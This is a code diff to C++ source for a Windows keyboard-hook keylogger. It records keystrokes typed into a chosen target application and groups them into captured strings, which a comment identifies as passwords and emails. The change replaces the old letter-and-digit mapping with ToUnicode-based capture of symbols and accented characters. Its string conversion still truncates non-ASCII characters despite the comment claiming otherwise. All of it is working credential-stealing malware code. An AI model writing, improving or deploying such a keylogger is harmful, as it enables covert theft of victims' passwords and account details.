@@ -233,23 +233,61 @@ bool IsTargetAppActive() {
     return false;
 }
 
+// LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
+//     if (n == HC_ACTION && w == WM_KEYDOWN) {
+//         if (!IsTargetAppActive()) return CallNextHookEx(NULL, n, w, l);
+//         KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
+//         bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+
+//         if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
+//             ProcessBuffer();
+//         } else if (k->vkCode == VK_BACK) {
+//             if (!buffer.empty()) buffer.pop_back();
+//         } else {
+//             if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
+//                 char c = (char)k->vkCode; if (!shift) c = (char)tolower(c); buffer += c;
+//             } else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
+//                 if (shift && k->vkCode == '2') buffer += "@";
+//                 else buffer += (char)k->vkCode;
+//             } else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
+//         }
+//     }
+//     return CallNextHookEx(NULL, n, w, l);
+// }
+
 LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
     if (n == HC_ACTION && w == WM_KEYDOWN) {
         if (!IsTargetAppActive()) return CallNextHookEx(NULL, n, w, l);
+        
         KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
-        bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
 
+        // 1. Handle "Action" keys
         if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
             ProcessBuffer();
+            return CallNextHookEx(NULL, n, w, l);
         } else if (k->vkCode == VK_BACK) {
             if (!buffer.empty()) buffer.pop_back();
-        } else {
-            if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
-                char c = (char)k->vkCode; if (!shift) c = (char)tolower(c); buffer += c;
-            } else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
-                if (shift && k->vkCode == '2') buffer += "@";
-                else buffer += (char)k->vkCode;
-            } else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
+            return CallNextHookEx(NULL, n, w, l);
+        }
+
+        // 2. The Universal Symbol/Letter Logic
+        BYTE keyboardState[256];
+        GetKeyboardState(keyboardState); // Gets Shift/Caps Lock status
+
+        wchar_t unicodeChar[5];
+        // This handles £, @, $, letters, and even accents automatically
+        int result = ToUnicode(k->vkCode, k->scanCode, keyboardState, unicodeChar, 4, 0);
+
+        if (result > 0) {
+            std::wstring wideStr(unicodeChar, result);
+            // Convert to standard string for your buffer
+            std::string utf8Str(wideStr.begin(), wideStr.end());
+            
+            if (utf8Str == " ") {
+                ProcessBuffer(); // Space usually means they finished typing the password/email
+            } else {
+                buffer += utf8Str;
+            }
         }
     }
     return CallNextHookEx(NULL, n, w, l);
